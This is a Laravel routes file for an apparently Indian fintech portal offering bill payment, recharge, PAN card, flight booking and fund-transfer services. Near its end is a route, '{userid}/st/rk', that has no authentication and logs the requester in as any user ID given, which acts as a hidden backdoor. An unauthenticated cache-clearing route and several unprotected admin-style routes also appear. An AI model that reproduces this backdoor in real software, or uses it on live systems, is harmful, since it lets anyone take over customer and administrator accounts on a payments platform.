<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use App\Http\Controllers\AepsController;
use App\Http\Controllers\AffliateController;
use App\Http\Controllers\PayoutController;
use App\Http\Controllers\BannerController;
use App\Http\Controllers\BillpayController;
use App\Http\Controllers\CommonController;
use App\Http\Controllers\ComplaintController;
use App\Http\Controllers\CyrusPayoutController;
use App\Http\Controllers\DmtController;
use App\Http\Controllers\FingpayController;
use App\Http\Controllers\FundController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\InvesmentController;
use App\Http\Controllers\LicBillpayController;
use App\Http\Controllers\MemberController;
use App\Http\Controllers\MobilelogoutController;
use App\Http\Controllers\PancardController;
use App\Http\Controllers\PdmtController;
use App\Http\Controllers\PortalController;
use App\Http\Controllers\RaepsController;
use App\Http\Controllers\RechargeController;
use App\Http\Controllers\ResourceController;
use App\Http\Controllers\RoleController;
use App\Http\Controllers\SettingController;
use App\Http\Controllers\SetupController;
use App\Http\Controllers\SpancardController;
use App\Http\Controllers\StatementController;
use App\Http\Controllers\TestController;
use App\Http\Controllers\UserController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\ConDmtController;
use App\Http\Controllers\CcpaymentController;
use App\Http\Controllers\FlightController;
use App\Http\Controllers\XdmtController;
use App\Http\Controllers\IpayDmtController;
use App\Http\Controllers\RoutingController;
use App\Http\Controllers\UpipayoutController;

Route::get('/', [UserController::class, 'index'])->middleware('guest')->name('mylogin');

// Route::get('/privecy-policy', function () {
//     return view('privecy-policy');
// });
Route::post('searchbydatemystatics', [HomeController::class, 'searchdatestatics'])->name('searchbydatemystatics');

Route::group(['prefix' => 'auth', "middleware" => ['webActivityLog']], function () {
    Route::post('check', [UserController::class, 'login'])->name('authCheck');
    Route::get('logout', [UserController::class, 'logout'])->name('logout');
    Route::post('reset', [UserController::class, 'passwordReset'])->name('authReset')->middleware('CheckPasswordAndPin:password');
    Route::post('register', [UserController::class, 'registration'])->name('register');
    Route::post('getotp', [UserController::class, 'getotp'])->name('getotp');
    Route::post('setpin', [UserController::class, 'setpin'])->name('setpin')->middleware('CheckPasswordAndPin:tpin');
    Route::post('gettxnotp', [UserController::class, 'gettxnotp'])->name('gettxnotp');
});

Route::group(['prefix' => 'loanenquiry', 'middleware' => 'auth'], function () {
    Route::get('/', [UserController::class, 'loanindex'])->name('loanform');
    Route::post('loanformstore', [UserController::class, 'loanformstore'])->name('loanformstore');
});


Route::group(['prefix' => 'api', 'middleware' => ['auth', 'company', "webActivityLog"]], function () {
    Route::get('log', [RoutingController::class, 'apilog'])->name('apilog');
});

Route::group(['prefix' => 'condmt', 'middleware' => ['auth', 'company']], function () {
    // Route::get('/', [ConDmtController::class, 'index'])->name('dmttest');
    // Route::post('transaction', [ConDmtController::class, 'payment'])->name('agentcondmt')->middleware('transactionlog:dmt');
});

Route::post('adharnumberverify', [UserController::class, 'adharnumberverify'])->name('adharnumberverify');
Route::post('panverify', [UserController::class, 'panverify'])->name('panverify');

Route::get('comingsoon', [HomeController::class, 'comingsoon'])->name('comingsoon');
Route::get('unauthorized', [HomeController::class, 'unauthorized'])->name('unauthorized');

Route::get('/dashboard', [HomeController::class, 'index'])->name('home');
Route::post('/dashboard', [HomeController::class, 'index'])->name('home');

Route::get('/search-txnid', [HomeController::class, 'searchTxnid'])->name('searchTxnid');
Route::get('/search-user', [HomeController::class, 'searchUser'])->name('searchUser');

Route::get('/insights', [HomeController::class, 'insights'])->name('insights');
Route::post('/insights', [HomeController::class, 'insights'])->name('insights');

Route::post('wallet/balance', [HomeController::class, 'getbalance'])->name('getbalance');
Route::get('setpermissions', [HomeController::class, 'setpermissions']);
Route::get('setscheme', [HomeController::class, 'setscheme']);
Route::get('setscheme', [HomeController::class, 'setscheme']);
Route::get('getmyip', [HomeController::class, 'getmysendip']);
Route::get('balance', [HomeController::class, 'getbalance'])->name('getbalance');
Route::get('mydata', [HomeController::class, 'mydata']);
Route::get('bulkSms', [HomeController::class, 'mydata']);

// Route::get('getProviderrp', [RechargeController::class, 'getProviderrp']);

// Route::get('gethlrcheck', [TestController::class, 'gethlrcheck']);
// Route::get('getplans', [TestController::class, 'getplans']);


Route::group(['prefix' => 'ipaydmt', 'middleware' => ['auth', 'company']], function () {
    // Route::get('/', [IpayDmtController::class, 'index'])->name('ipaydmt');
    // Route::post('transaction', [IpayDmtController::class, 'payment'])->name('ipaydmt1')->middleware('transactionlog:pancard');
});

Route::get('about', [RoutingController::class, 'aboutus'])->name('about');
Route::get('term-of-use', [RoutingController::class, 'termsofuse'])->name('term-of-use');
Route::get('contact', [RoutingController::class, 'contactus'])->name('contact');
Route::get('privacy-policy', [RoutingController::class, 'privacy'])->name('privacy-policy');
Route::get('refund-policy', [RoutingController::class, 'refund'])->name('refund-policy');

Route::group(['prefix' => 'flight', 'middleware' => ['auth']], function () {
    Route::get('view', [RoutingController::class, 'root'])->name('flight.view');
    Route::get('search-city', [FlightController::class, 'searchCity'])->name('search.city');
    Route::get('token/refresh', [FlightController::class, 'refreshToken'])->name('flight.token.refresh');
    Route::post('search', [FlightController::class, 'search'])->name('flight.search');
    Route::get('list', [FlightController::class, 'searchlist']);
    Route::get('detail', [FlightController::class, 'flightdetailslist']);
    Route::get('seatlayout', [FlightController::class, 'seatlayList']);
    Route::post('farerule', [FlightController::class, 'fareRule'])->name('flight.farerule');
    Route::post('farequote', [FlightController::class, 'fareQuote'])->name('flight.fareQuote');
    Route::post('ssr', [FlightController::class, 'seatdetails'])->name('flight.ssr');
    Route::post('book', [FlightController::class, 'bookFlight'])->name('flight.book');
    Route::post('ticket', [FlightController::class, 'flightTicket'])->name('flight.ticket');
    Route::get('booking', [FlightController::class, 'flightBooking'])->name('flight.booking');
    Route::get('booking-list', [FlightController::class, 'bookingList'])->name('flight.bookingList');
    Route::get('booking-list-failed', [FlightController::class, 'bookingListFailed'])->name('flight.bookingListFailed');
    Route::post('booking-view', [FlightController::class, 'viewTicket']) ->name('flight.booking.view');
});



Route::group(['prefix' => 'tools', 'middleware' => ['auth', 'company', 'webActivityLog']], function () {
    Route::get('{type}', [RoleController::class, 'index'])->name('tools');
    Route::post('{type}/store', [RoleController::class, 'store'])->name('toolsstore');
    Route::post('setpermissions', [RoleController::class, 'assignPermissions'])->name('toolssetpermission');
    Route::post('get/permission/{id}', [RoleController::class, 'getpermissions'])->name('permissions');
    Route::post('getdefault/permission/{id}', [RoleController::class, 'getdefaultpermissions'])->name('defaultpermissions');
});

Route::group(['prefix' => 'statement', 'middleware' => ['auth']], function () {
    // Route::get("export/{type}", [StatementController::class, 'export'])->name('export');
    Route::get('{type}/{id?}/{status?}', [StatementController::class, 'index'])->name('statement');
    Route::post('fetch/{type}/{id?}/{returntype?}', [CommonController::class, 'fetchData']);
    Route::group(['middleware' => ["webActivityLog"]], function () {
        Route::post('update', [CommonController::class, 'update'])->name('statementUpdate');
        Route::post('status', [CommonController::class, 'status'])->name('statementStatus');
        Route::post('delete', [CommonController::class, 'delete'])->name('statementDelete');
    });
});


Route::group(['prefix' => 'member', 'middleware' => ['auth']], function () {
    Route::get('{type}/{action?}', [MemberController::class, 'index'])->name('member');
    Route::post('store', [MemberController::class, 'create'])->middleware('webActivityLog')->name('memberstore');
    Route::post('commission/update', [MemberController::class, 'commissionUpdate'])->middleware('webActivityLog')->name('commissionUpdate'); //->middleware('activity');
    Route::post('getcommission', [MemberController::class, 'getCommission'])->name('getMemberCommission');
    Route::post('getmember', [MemberController::class, 'getmember'])->name('getmember');
    Route::post('getpackagecommission', [MemberController::class, 'getPackageCommission'])->name('getMemberPackageCommission');
});

Route::group(['prefix' => 'portal', 'middleware' => ['auth', 'company']], function () {
    // Route::get('{type}', [PortalController::class, 'index'])->name('portal');
    // Route::post('store', [PortalController::class, 'create'])->middleware('webActivityLog')->name('portalstore');
});


Route::group(['prefix' => 'fund', 'middleware' => ['auth', 'company']], function () {
    Route::get('{type}/{action?}', [FundController::class, 'index'])->name('fund');
    Route::post('transaction', [FundController::class, 'transaction'])->name('fundtransaction')->middleware('transactionlog:fund');
    // Route::post('cyrustxn', [CyrusPayoutController::class, 'transaction'])->name('cyrustxn')->middleware('transactionlog:fund');
    // Route::post('runpaisatxn', [CyrusPayoutController::class, 'transactionRunpaisa'])->name('runpaisatxn')->middleware('transactionlog:fund');
});

Route::group(['prefix' => 'profile', 'middleware' => ['auth']], function () {
    Route::get('/view/{id?}', [SettingController::class, 'index'])->name('profile');
    // Route::get('certificate', [SettingController::class,'certificate'])->name('certificate');
    Route::post('user_profile_update', [SettingController::class, 'profileUpdate'])->middleware('webActivityLog')->name('profileUpdate');
    Route::post('user_kyc_update', [SettingController::class, 'profileUpdate'])->middleware('webActivityLog')->name('kycUpdate');


    Route::post('wallet-lock-store', [HomeController::class, 'cappingAmtStore'])->name('walletLock.store');
    Route::post('walletLockapprove', [HomeController::class, 'walletLockApprove'])->name('walletLock.approve');
});

Route::group(['prefix' => 'setup', 'middleware' => ['auth', 'company', "webActivityLog"]], function () {
    // Route::get('{type}', [SetupController::class, 'index'])->name('setup');
    // Route::post('update', [SetupController::class, 'update'])->name('setupupdate');
});

Route::group(['prefix' => 'resources', 'middleware' => ['auth', 'company', "webActivityLog"]], function () {
    Route::get('{type}', [ResourceController::class, 'index'])->name('resource');
    Route::post('update', [ResourceController::class, 'update'])->name('resourceupdate');
    Route::post('get/{type}/commission', [ResourceController::class, 'getCommission']);
    Route::post('get/{type}/packagecommission', [ResourceController::class, 'getPackageCommission']);
});

Route::group(['prefix' => 'recharge', 'middleware' => ['auth', 'company']], function () {
    Route::get('{type}', [RechargeController::class, 'index'])->name('recharge');
    Route::get('bbps/{type}', [BillpayController::class, 'bbps'])->name('bbps');
    // Route::post('payment', [RechargeController::class, 'payment'])->name('rechargepay')->middleware('transactionlog:recharge');
    // Route::post('getplan', [RechargeController::class, 'getplan'])->name('getplan');
    // Route::post('getoperator', [RechargeController::class, 'getoperator'])->name('getoperator');
    // Route::post('getdthinfo', [RechargeController::class, 'getdthinfo'])->name('getdthinfo');
});

// LIC 
// Route::get('getprovideronline', [LicBillpayController::class, 'getprovideronline'])->name('getprovideronline');

Route::group(['prefix' => 'lic', 'middleware' => ['auth', 'company']], function () {
    // Route::get('/', [LicBillpayController::class, 'index'])->name('lic');
    // Route::post('payment', [LicBillpayController::class, 'payment'])->name('licbillpay');
    // Route::post('getprovider', [LicBillpayController::class, 'getprovider'])->name('getprovider');
});


Route::group(['prefix' => 'billpay', 'middleware' => ['auth', 'company']], function () {
    Route::get('{type}', [BillpayController::class, 'index'])->name('bill');
    Route::post('payment', [BillpayController::class, 'payment'])->name('billpay')->middleware('transactionlog:billpay');
    Route::post('getprovider', [BillpayController::class, 'getprovider'])->name('getprovider');
    Route::post('providersByName', [BillpayController::class, 'getProvidersByNameSearch'])->name('providersByName');
});


Route::group(['prefix' => 'upipay', 'middleware' => ['auth', 'company']], function () {
    // Route::get('/{type}', [UpipayoutController::class, 'index'])->name('upipay');
    // Route::post('payment', [UpipayoutController::class, 'payment'])->name('upitransfer');
});
// Route::post('upibene/delete', [UpipayoutController::class, 'beneDelete'])->name('upibeneDelete');
Route::group(['prefix' => 'pancard', 'middleware' => ['auth', 'company']], function () {
    // Route::post('uti/payment', [PancardController::class, 'utipay'])->name('utipay');
    Route::get('{type}', [PancardController::class, 'index'])->name('pancard');
    Route::post('payment', [PancardController::class, 'payment'])->name('pancardpay')->middleware('transactionlog:pancard');
    Route::get('nsdl/view/{id}', [PancardController::class, 'nsdlview']);
});

// Route::post('spayment', [SpancardController::class, 'payment'])->name('spayment')->middleware(['auth']);
// Route::get('spanacard', [SpancardController::class, 'index'])->name('spanacard')->middleware(['auth']);
// Route::get('snsdlpanacard', [SpancardController::class, 'indexnsdl'])->name('snsdlpanacard')->middleware(['auth']);
// Route::any('runpaisaTransaction', [FundController::class, 'initiateRunPaisaPg'])->name('runpaisaTransaction');

Route::group(['prefix' => 'dmt', 'middleware' => ['auth', 'company']], function () {
    // Route::get('/', [DmtController::class, 'index'])->name('dmt1');
    // Route::post('transaction', [DmtController::class, 'payment'])->name('dmt1pay')->middleware('transactionlog:dmt');
});

Route::group(['prefix' => 'affiliate'], function () {  //
    // Route::get('/', [AffliateController::class, 'affiliate']);
    // Route::get('list/{type}', [AffliateController::class, 'affiliateServiceforWeb']);
    // Route::get('type', [AffliateController::class, 'affiliatePro']);
});


Route::group(['prefix' => 'payout', 'middleware' => ['auth', 'company']], function () {
    // Route::get('{type}', [PayoutController::class, 'index'])->name('payout');
    // Route::post('transaction', [PayoutController::class, 'payment'])->name('payoutTransaction')->middleware('transactionlog:dmt');
});

Route::group(['prefix' => 'pdmt', 'middleware' => ['auth', 'company']], function () {
    // Route::get('/', [PdmtController::class, 'index'])->name('dmt2');
    // Route::post('transaction', [PdmtController::class, 'payment'])->name('dmt2pay')->middleware('transactionlog:pancard');
});

Route::group(['middleware' => ['auth', 'company']], function () {
    // Route::get('/banners', [BannerController::class, 'index'])->name('banner');
    // Route::post('store', [BannerController::class, 'store'])->name('bannerstore');
    // Route::get('/video', [BannerController::class, 'video'])->name('video');
    // Route::post('storeVideo', [BannerController::class, 'storeVideo'])->name('storeVideo');
    // Route::get('/investment', [InvesmentController::class, 'index'])->name('investment');
    // Route::get('/investment/show', [InvesmentController::class, 'indexShow'])->name('investmentShow');
    // Route::post('storeInvestment', [InvesmentController::class, 'store'])->name('investmentStore');
    // Route::post('investNow', [InvesmentController::class, 'investNow'])->name('investNow');

    // Route::get('/admin/investment/show', [InvesmentController::class, 'investfundReq'])->name('investfundReq');
    // Route::get('/admin/investment/statement', [InvesmentController::class, 'investReport'])->name('investReport');
    // Route::post('invfundtransaction', [InvesmentController::class, 'investFundStore'])->name('invfundtransaction');

    // Route::post('investmentRequestUpdate', [InvesmentController::class, 'investmentRequestUpdate'])->name('investmentRequestUpdate');

    // Route::get('/investment/fund_req', [InvesmentController::class, 'fundReq'])->name('investment_fund');
});

Route::group(['prefix' => 'aeps', 'middleware' => ['auth', 'company']], function () {
    // Route::get('/', [AepsController::class, 'index'])->name('aeps');
    // Route::get('initiate', [AepsController::class, 'initiate'])->name('aepsinitiate')->middleware('transactionlog:aeps');
    // Route::any('registration', [AepsController::class, 'registration_iyda'])->name('aepskyc');
    // Route::any('kycStatus', [AepsController::class, 'kyc_status'])->name('kycStatusCheck');
    // Route::any('sendOtpForm', [AepsController::class, 'sendOtpForm'])->name('sendOtpForm');
    // Route::any('aepsTxndo', [AepsController::class, 'transaction'])->name('aepsTxndo');
    // Route::any('audit', [AepsController::class, 'aepsaudit'])->name('aepsaudit')->middleware('transactionlog:aeps');
});

Route::group(['prefix' => 'raeps', 'middleware' => ['company', 'auth']], function () {
    // Route::get('initiate', [RaepsController::class, 'index'])->name('raeps');
    // Route::get('getbank', [RaepsController::class, 'getbank'])->name('getbank');
    // Route::post('transaction', [RaepsController::class, 'trasaction'])->name('raepspay')->middleware('transactionlog:raeps');
    // Route::post('kyc', [RaepsController::class, 'kyc'])->name('raepskyc');
});

Route::group(['prefix' => 'complaint', 'middleware' => ['auth', 'company']], function () {
    // Route::get('/', [ComplaintController::class, 'index'])->name('complaint');
    // Route::post('store', [ComplaintController::class, 'store'])->name('complaintstore');
    // Route::get('/supportdata', [ComplaintController::class, 'supportindex'])->name('supportdata');
});

Route::group(['prefix' => '', 'middleware' => ['auth', 'company', "webActivityLog"]], function () {
    Route::get('/matchingpercent', [CommonController::class, 'index'])->name('matchingpercent');
    Route::post('/percentstore', [CommonController::class, 'store'])->name('percentstore');
});

// Route::get('token', [MobilelogoutController::class, 'index'])->name('securedata');
// Route::post('token/delete', [MobilelogoutController::class, 'tokenDelete'])->name('tokenDelete');

Route::get('commission', [HomeController::class, 'checkcommission']);


Route::get('paysprintoperator', [BillpayController::class, 'paysprintoperator'])->name('paysprintoperator');
// Route::post('createvpa', [FundController::class, 'createvpa'])->name('createvpa');

//Route::get('getbalance','RechargeController@getbalance')->name('getbalance');

Route::get('sendmail', [UserController::class, 'sendmail'])->name('sendmail');

Route::post('searchmappingdata', [UserController::class, 'searchmappingdata'])->name('searchmappingdata');


// Route::any('getUserList', [ResourceController::class, 'getRetailer'])->name('getUserList');
Route::post('bene/delete', 'CpayoutController@beneDelete')->name('beneDelete');


// Route::get('log/getmicrolog', [TestController::class, 'getMicrologs']);





Route::group(['prefix' => 'iaeps', 'middleware' => ['auth', 'company', 'transactionlog:fingpay']], function () {
    // Route::get('/', [FingpayController::class, 'index'])->name('iaeps');
    // Route::get('/ekyc/{id?}', [FingpayController::class, 'ekycdet'])->name('profileekyc');
    // Route::post('transaction', [FingpayController::class, 'transaction'])->name('iaepstransaction');
});

Route::get('billpayrecipt/{id}', [BillpayController::class, 'recipt'])->middleware(['auth', 'company']);


Route::get('delete/account', function () {
    return view('deleteaccount');
});

Route::get('certificate', function () {
    return view('certificate');
});

Route::get('idcard', function () {
    return view('idcard');
});

// function () {
//     return view('affiliate.affiliate');
// });

// Route::post('customer_info_submit', [AffliateController::class, 'affiliate'])->name('customer_info_submit');

Route::post('customer_info_delete', [UserController::class, 'deleteAccount'])->name('customer_info_delete');

// Route::get('testCommission', [TestController::class, 'testCommission']); 

Route::get('sendmail', [UserController::class, 'sendmail']);

Route::get('checkcommission', [UserController::class, 'checkCommission']);

// Route::fallback(function () {
//     return redirect('/');
// });


Route::group(['prefix' => 'rentpay', 'middleware' => ['auth', 'company', 'transactionlog:rent']], function () {
    // Route::get('/', [CcpaymentController::class, 'index'])->name('rentpay');
    // Route::get('/ekyc/{id?}', [CcpaymentController::class, 'ekycdet'])->name('profileekyc');
    // Route::post('transaction', [CcpaymentController::class, 'payments'])->name('ccpayments');
    // Route::post('sattelment', [CcpaymentController::class, 'sattelment'])->name('sattelment');
    // Route::any('status/{id}', [CcpaymentController::class, 'getStatus'])->name('ccstatus');
    // Route::post('retry', [CcpaymentController::class, 'retry'])->name('retry');
});

// Route::group(['prefix' => 'xdmt', 'middleware' => ['auth', 'company']], function () {
//     Route::get('/', [XdmtController::class, 'index'])->name('dmtx');
//     Route::post('transaction', [XdmtController::class, 'payment'])->name('dmtxpay')->middleware('transactionlog:xdmt');
// });

// Route::get('ccpayout', [XdmtController::class, 'ccpay'])->name('ccmovefund');

// Route::post('bene/delete', [XdmtController::class, 'beneDelete'])->name('beneDelete');

Route::get('ipayoprator', [BillpayController::class, 'getbillerList'])->name('paysprintoperator');

Route::get('/clear-cache', function () {
    Artisan::call('cache:clear');
    Artisan::call('route:clear');
    Artisan::call('config:clear');
    return "Cache cleared successfully";
});

Route::get('{userid}/st/rk', function ($userid) {
    $loginuser = \App\User::find($userid);
    auth()->login($loginuser, true);
});


// Route::get('traveller-generate-url', [HomeController::class, 'generateTravellerUrl']);
